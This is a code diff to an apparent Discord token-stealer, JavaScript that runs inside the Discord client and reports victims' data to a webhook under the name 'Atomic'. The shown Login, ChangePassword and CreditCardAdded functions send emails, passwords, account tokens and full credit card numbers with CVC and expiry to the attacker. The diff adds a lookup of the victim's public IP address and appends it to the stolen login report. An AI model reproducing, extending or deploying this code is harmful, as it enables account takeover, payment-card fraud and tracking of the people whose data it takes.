@@ -183,6 +183,12 @@ function Login(email, password, token) {
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
+        window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, !0).then((ip) => {
         const json = JSON.parse(info);
         var params = {
             username: "Atomic",
@@ -210,6 +216,12 @@ function Login(email, password, token) {
                             "name": "<a:discord_gif:709806861351911445> | Other :",
                             "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                             "inline": false
+                        },
+
+
+                        {
+                            "name": ":globe_with_meridians: | Ip :",
+                            "value": `\`${ip}`
                         }
                     ],
                     "author": {
@@ -224,6 +236,7 @@ function Login(email, password, token) {
         }
         SendToWebhook(JSON.stringify(params))
     })
+})
 }
 
 function ChangePassword(oldpassword, newpassword, token) {
@@ -348,16 +361,20 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         {
                             "name": ":credit_card: | Credit Card Added",
                             "value": `Credit Card Number: \`${number}\`\nCVC: \`${cvc}\`\nCredit Card Expiration: \`${expir_month}/${expir_year}\``,
-                            "inline": true
+                            "inline": false
                         },
-                        {
-                            "name": "<a:discord_gif:709806861351911445> | Other :",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
-                            "inline": true
-                        },
+
+
                         {
                             "name": ":unlock: | Token :",
                             "value": `\`${token}\``,
+                            "inline": false
+                        },
+
+
+                        {
+                            "name": "<a:discord_gif:709806861351911445> | Other :",
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                             "inline": false
                         }
                     ],
